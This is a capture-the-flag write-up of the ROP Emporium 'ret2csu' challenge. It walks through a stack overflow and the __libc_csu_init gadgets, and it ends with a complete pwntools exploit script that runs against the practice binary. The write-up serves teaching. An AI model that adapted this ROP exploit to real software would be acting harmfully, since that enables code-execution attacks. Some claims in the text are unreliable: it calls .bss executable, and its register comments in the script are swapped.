---
title: "RopEmporium - ret2csu"
date: 2021-12-20T14:27:14Z
draft: false
authors: ["Thuri"]
tags: ["rop", "RopEmporium"]
summary: The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge"
toc:
    enable: true
    auto: false

code:
    maxShownLines: 100
---

> We're back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them?
> The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website [Ropemporium](https://ropemporium.com)

After downloading the binary, check enabled protections and mitigation's. Only **NX** and Partial RELRO protections are turned on as shown below.

```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

First is finding the vulnerability in the binary that will enable us to subvert program execution control flow. From the disassembly of main function we are only calling **pwnme** function.

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400607 <+0>:	push   rbp
   0x0000000000400608 <+1>:	mov    rbp,rsp
   0x000000000040060b <+4>:	call   0x400500 <pwnme@plt>
   0x0000000000400610 <+9>:	mov    eax,0x0
   0x0000000000400615 <+14>:	pop    rbp
   0x0000000000400616 <+15>:	ret
End of assembler dump.
```

The function reference the `got table` in order to load the actual address of `pwnme` function from **libret2csu.so** library after the first call.

## pwnme Function Disassembly

```asm
(gdb) disas pwnme
Dump of assembler code for function pwnme:
  0x000000000000093a <+0>:	push   rbp
  0x000000000000093b <+1>:	mov    rbp,rsp
  0x000000000000093e <+4>:	sub    rsp,0x20
  0x0000000000000942 <+8>:	mov    rax,QWORD PTR [rip+0x201697]        # 0x201fe0
  0x0000000000000949 <+15>:	mov    rax,QWORD PTR [rax]
  0x000000000000094c <+18>:	mov    ecx,0x0
  0x0000000000000951 <+23>:	mov    edx,0x2
  0x0000000000000956 <+28>:	mov    esi,0x0
  0x000000000000095b <+33>:	mov    rdi,rax
  0x000000000000095e <+36>:	call   0x820 <setvbuf@plt>
  0x0000000000000963 <+41>:	lea    rdi,[rip+0x31e]        # 0xc88
  0x000000000000096a <+48>:	call   0x7a0 <puts@plt>
  0x000000000000096f <+53>:	lea    rdi,[rip+0x32a]        # 0xca0
  0x0000000000000976 <+60>:	call   0x7a0 <puts@plt>
  0x000000000000097b <+65>:	lea    rax,[rbp-0x20]
  0x000000000000097f <+69>:	mov    edx,0x20
  0x0000000000000984 <+74>:	mov    esi,0x0
  0x0000000000000989 <+79>:	mov    rdi,rax
  0x000000000000098c <+82>:	call   0x7d0 <memset@plt>
  0x0000000000000991 <+87>:	lea    rdi,[rip+0x310]        # 0xca8
  0x0000000000000998 <+94>:	call   0x7a0 <puts@plt>
  0x000000000000099d <+99>:	lea    rdi,[rip+0x36e]        # 0xd12
  0x00000000000009a4 <+106>:	mov    eax,0x0
  0x00000000000009a9 <+111>:	call   0x7c0 <printf@plt>
  0x00000000000009ae <+116>:	lea    rax,[rbp-0x20]
  0x00000000000009b2 <+120>:	mov    edx,0x200
  0x00000000000009b7 <+125>:	mov    rsi,rax
  0x00000000000009ba <+128>:	mov    edi,0x0
  0x00000000000009bf <+133>:	call   0x7f0 <read@plt>
  0x00000000000009c4 <+138>:	lea    rdi,[rip+0x34a]        # 0xd15
  0x00000000000009cb <+145>:	call   0x7a0 <puts@plt>
  0x00000000000009d0 <+150>:	nop
  0x00000000000009d1 <+151>:	leave
  0x00000000000009d2 <+152>:	ret
End of assembler dump.
(gdb)
```

From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size `32bytes` and reading **0x200** from the standard input file descriptor, which is more than the buffer size.
The c equivalent of the above vulnerability is,

```c
read(0, *(rbp-0x20), 0x200) #reading 0x200 from the stdin
```

For exploitation purpose, goal is to control the return address of `pwnme` function and redirect execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.

![ret control](/ropemporium/stack.png)

From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the **NX** execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.

## **libc_csu_init** Disassembly

Below is the disassembled code for **\_\_libc_csu_init** section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.

```asm
0000000000400640 <__libc_csu_init>:
  400640:	41 57                	push   r15
  400642:	41 56                	push   r14
  400644:	49 89 d7             	mov    r15,rdx
  400647:	41 55                	push   r13
  400649:	41 54                	push   r12
  40064b:	4c 8d 25 9e 07 20 00 	lea    r12,[rip+0x20079e]        # 600df0 <__frame_dummy_init_array_entry>
  400652:	55                   	push   rbp
  400653:	48 8d 2d 9e 07 20 00 	lea    rbp,[rip+0x20079e]        # 600df8 <__do_global_dtors_aux_fini_array_entry>
  40065a:	53                   	push   rbx
  40065b:	41 89 fd             	mov    r13d,edi
  40065e:	49 89 f6             	mov    r14,rsi
  400661:	4c 29 e5             	sub    rbp,r12
  400664:	48 83 ec 08          	sub    rsp,0x8
  400668:	48 c1 fd 03          	sar    rbp,0x3
  40066c:	e8 5f fe ff ff       	call   4004d0 <_init>
  400671:	48 85 ed             	test   rbp,rbp
  400674:	74 20                	je     400696 <__libc_csu_init+0x56>
  400676:	31 db                	xor    ebx,ebx
  400678:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
  40067f:	00
  400680:	4c 89 fa             	mov    rdx,r15
  400683:	4c 89 f6             	mov    rsi,r14
  400686:	44 89 ef             	mov    edi,r13d
  400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  40068d:	48 83 c3 01          	add    rbx,0x1
  400691:	48 39 dd             	cmp    rbp,rbx
  400694:	75 ea                	jne    400680 <__libc_csu_init+0x40>
  400696:	48 83 c4 08          	add    rsp,0x8
  40069a:	5b                   	pop    rbx
  40069b:	5d                   	pop    rbp
  40069c:	41 5c                	pop    r12
  40069e:	41 5d                	pop    r13
  4006a0:	41 5e                	pop    r14
  4006a2:	41 5f                	pop    r15
  4006a4:	c3                   	ret
  4006a5:	90                   	nop
  4006a6:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  4006ad:	00 00 00

00000000004006b0 <__libc_csu_fini>:
  4006b0:	f3 c3                	repz ret z
```

The **\_\_libc_csu_init** section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control **RBX, RBP, R12, R13, R14, and R15** registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.

The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.

```asm
  40069a:	5b                   	pop    rbx
  40069b:	5d                   	pop    rbp
  40069c:	41 5c                	pop    r12
  40069e:	41 5d                	pop    r13
  4006a0:	41 5e                	pop    r14
  4006a2:	41 5f                	pop    r15
  4006a4:	c3                   	ret
```

For the second stage, we need to look for the gadgets that will enable us to control the **RDI, RSI and RDX** registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in **RDI, RSI and RDX** registers respectively. From the disassembly of **\_\_libc_csu_init** we can get our second gadget to build our rop chain.

```asm
mov    rdx,r15
mov    rsi,r14
mov    edi,r13d
call   QWORD PTR [r12+rbx*8]
```

From the above code, we are now able to control the **rdx, rsi and edi** registers.The call in the second stage gadgets, calculates the destination address of our code.

Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to **ret2win** challenge.

> This challenge is very similar to "callme", with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the "callme" challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM & MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.

From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.

```asm
rdi <-- r13 <--  #first args   0xdeadbeefdeadbeef
rsi <-- r14 <--  #second args  0xcafebabecafebabe
rdx <-- r15 <--  #third args   0xd00df00dd00df00d
```

From code snip above, we can control the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb to ensure that there is no unexpected behavior which may cause crashes.

Set a breakpoint in our first address of the ropchain gadget, and run binary with the generated payload.

```asm
(gdb) break *0x000000000040069a
Breakpoint 1 at 0x40069a
(gdb) r </tmp/payload
Starting program: /home/vx/Downloads/rop/rop/ret2csu/ret2csu </tmp/payload

Breakpoint 1, 0x000000000040069a in __libc_csu_init ()
(gdb) c
Continuing.
ret2csu by ROP Emporium
x86_64
Breakpoint 1, 0x000000000040069a in __libc_csu_init ()
(gdb)
```

When the program is run,it hits the set breakpoint. Type **c** command for paused process to continue the execution. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of breakpoint, the execution stops. We can inspect the memory to understand the behavior of the program and values loaded in the registers.

```asm
(gdb) x/10i $rip
=> 0x40069a <__libc_csu_init+90>:	pop    rbx
   0x40069b <__libc_csu_init+91>:	pop    rbp
   0x40069c <__libc_csu_init+92>:	pop    r12
   0x40069e <__libc_csu_init+94>:	pop    r13
   0x4006a0 <__libc_csu_init+96>:	pop    r14
   0x4006a2 <__libc_csu_init+98>:	pop    r15
   0x4006a4 <__libc_csu_init+100>:	ret
   0x4006a5:	nop
   0x4006a6:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x4006b0 <__libc_csu_fini>:	repz ret
```

Now we can Single step in the debugger and view the values stored in the registers of our gadget. The command for single stepping in gdb is **si**.

```asm
(gdb) i r rbx rbp r12 r13 r14 r15
rbx            0x4343434343434343  4846791580151137091
rbp            0x4242424242424242  0x4242424242424242
r12            0x4141414141414141  4702111234474983745
r13            0xdeadbeefdeadbeef  -2401053088876216593
r14            0xcafebabecafebabe  -3819410105351357762
r15            0xd00df00dd00df00d  -3454841397007486963
(gdb)
```

From assembly code code above we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.

```asm
import pwn

pop_gadget = pwn.p64(0x0040069a)
payload =b"A"*32 #fill the buffer
payload +=b"B"*8 #rbp(saved)
payload += pop_gadget  #retaddr
payload += pwn.p64(0x4343434343434343)#rbx
payload += pwn.p64(0x4242424242424242)#rbp
payload += pwn.p64(0x4141414141414141) #r12
payload += pwn.p64(0xdeadbeefdeadbeef) #r13
payload += pwn.p64(0xcafebabecafebabe) #r14
payload += pwn.p64(0xd00df00dd00df00d) #r15
open('payload', 'wb').write(payload)
```

Next step is determining the correct or desired values for **rbx, rbp and r12** registers because 0x41..., 0x42...., 0x43... are not valid memory addresses.For execution of second rop gadget chain, we need to set right values of `rbp` and `rbx` due to a loop conditional.

```asm
   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:	add    rbx,0x1
   0x0000000000400691 <+81>:	cmp    rbp,rbx
   0x0000000000400694 <+84>:	jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:	add    rsp,0x8
```

Second gadget starts at **0x0000000000400680**,in which we are set values of rdi,r14 and rdx with correct argument values. Set values of **rbx** and **rbp** correctly so that conditional **cmp** is always true. Because of add instruction of 1 to rbx, `rbx` value needs to be 0 and `rbp` value to 1. when the registers are compared, the values are equal and Zero flag is set.

NB: "Adjust values in payload script and single step to confirm the validity of new values in the memory."

For register **r12**, the address should lie in executable memory address. The **.bss** section is executable, therefore r12 should be set to memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.

Lastly we need to control the **rdi** register with the value **0xdeadbeefdeadbeef**. Because we have full control of rdx and rsi register, next is to look for a `pop rdi, ret` gadget.

```asm
  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret
```

Now we can pass the **0xdeadbeefdeadbeef** argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.

The full code of the rop chain is as shown below.

```python
import pwn

pwn.context.encoding = "latin-1"
pwn.warnings.simplefilter("ignore")
pwn.context.arch = "amd64"
io = pwn.process('./ret2csu')

#arguments passed to ret2win function ret2win(arg1, arg2, arg3)
arg1 =pwn.p64(0xdeadbeefdeadbeef)
arg2 =pwn.p64(0xcafebabecafebabe)
arg3 =pwn.p64(0xd00df00dd00df00d)

ret2win_addr =pwn.p64(io.elf.plt['ret2win'])   #resolve address of ret2win function
pop_rbx_rbp_r12_r13_r14_r15_addr = pwn.p64(0x0040069a)  #first stage gadget
dereference_pointer = pwn.p64(0x00600e48)  #bss area which is executable
stage2_addr = pwn.p64(0x00400680)  #addr of second stage rop chain
pop_rdi = pwn.p64(0x004006a3)

# ropchains
#stage1 ropchain
'''
            0x0040069a      pop   rbx
│           0x0040069b      pop   rbp
│           0x0040069c      pop   r12
│           0x0040069e      pop   r13
│           0x004006a0      pop   r14
│           0x004006a2      pop   r15
└           0x004006a4      ret
'''
#Determine the loop values for conditional branch
'''
╎│          0x00400689      call  qword [r12 + rbx*8]
│      ╎│   0x0040068d      add   rbx, 1
│      ╎│   0x00400691      cmp   rbp, rbx
│      └──< 0x00400694      jne   0x400680
'''

stage1 = pop_rbx_rbp_r12_r13_r14_r15_addr
stage1 += pwn.p64(0)   #set RBP=0
stage1 += pwn.p64(1)   #set RBX=1
stage1 += dereference_pointer #set R12
stage1 += arg1   #R13
stage1 += arg2   #R14
stage1 += arg3   #R15
stage1 += stage2_addr
stage1 += pwn.p64(0)*7   #adjust the stack

#stage2
'''
   ┌──>     0x00400680      mov   rdx, r15
│      ╎│   0x00400683      mov   rsi, r14
│      ╎│   0x00400686      mov   edi, r13d
│      ╎│   0x00400689      call  qword [r12 + rbx*8]
'''

stage2 = pop_rdi
stage2 +=arg1
stage2 +=ret2win_addr

payload = b"A"*32
payload += b"B"*8
payload += b"" .join([
    stage1,
    stage2
    ])

io.writeafter('>', payload)
pwn.info(io.recvall().decode())
```

Running the code above we get a correct flag

```bash
vx@archie:ret2csu$ python3 xpl.py
[+] Starting local process './ret2csu': pid 18869
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Receiving all data: Done (45B)
[*] Process './ret2csu' stopped with exit code 0 (pid 18869)
[*]  Thank you!
    ROPE{a_placeholder_32byte_flag!}
```

## References

1. [ Universal ROP or Return-to-csu](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)
2. [Linux program startup](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)
